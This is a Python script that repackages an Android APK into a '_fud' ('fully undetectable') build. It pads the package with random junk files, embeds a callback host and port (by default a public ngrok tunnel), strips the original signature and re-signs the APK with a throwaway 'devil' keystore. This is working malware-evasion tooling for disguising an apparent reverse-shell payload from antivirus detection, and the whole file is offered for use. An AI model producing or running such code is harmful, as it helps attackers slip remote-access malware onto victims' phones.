#!/usr/bin/env python3
import os, sys, shutil, zipfile, tempfile, subprocess, random, string
LHOST=os.getenv("LHOST","0.tcp.in.ngrok.io").strip()
LPORT=os.getenv("LPORT","12345").strip()
def log(m): print(m,flush=True)
def rs(n=8): return ''.join(random.choices(string.ascii_letters+string.digits,k=n))
def build(inp,out):
    tmp=tempfile.mkdtemp()
    try:
        with zipfile.ZipFile(inp,'r') as zin: zin.extractall(tmp)
        assets=os.path.join(tmp,"assets"); os.makedirs(assets,exist_ok=True)
        for i in range(20):
            open(os.path.join(assets, f".{rs(8)}.bin"),"wb").write(os.urandom(random.randint(800,3000)))
        for i in range(5):
            d=os.path.join(tmp, f"res/drawable-{rs(4)}"); os.makedirs(d,exist_ok=True)
            open(os.path.join(d, f"{rs(6)}.png"),"wb").write(os.urandom(1024))
        open(os.path.join(tmp, f"{rs(6)}.txt"),"w").write(f"{LHOST}:{LPORT}\n{rs(64)}")
        mf=os.path.join(tmp,"META-INF")
        if os.path.exists(mf): shutil.rmtree(mf)
        with zipfile.ZipFile(out,'w',zipfile.ZIP_DEFLATED) as z:
            for r,_,fs in os.walk(tmp):
                for f in fs:
                    fp=os.path.join(r,f); z.write(fp, os.path.relpath(fp,tmp))
            z.comment=os.urandom(8)
        log(f"obf {os.path.getsize(out)}")
    finally: shutil.rmtree(tmp,ignore_errors=True)
def sign(apk):
    try:
        ks="devil.keystore"
        if not os.path.exists(ks):
            subprocess.check_call(f'keytool -genkey -keyalg RSA -alias devil -keystore {ks} -storepass 123456 -keypass 123456 -dname "CN={rs(6)}, OU={rs(4)}, O={rs(4)}, C=IN" -validity 10000',shell=True)
        subprocess.check_call(f'jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore {ks} -storepass 123456 {apk} devil',shell=True)
        log("signed"); return True
    except Exception as e: log(f"sign fail {e}"); return False
if __name__=="__main__":
    inp=sys.argv[1]; out=sys.argv[2] if len(sys.argv)>2 else inp.replace(".apk","_fud.apk")
    build(inp,out)
    if not sign(out): shutil.copy(inp,out)
    log(f"done {out}")
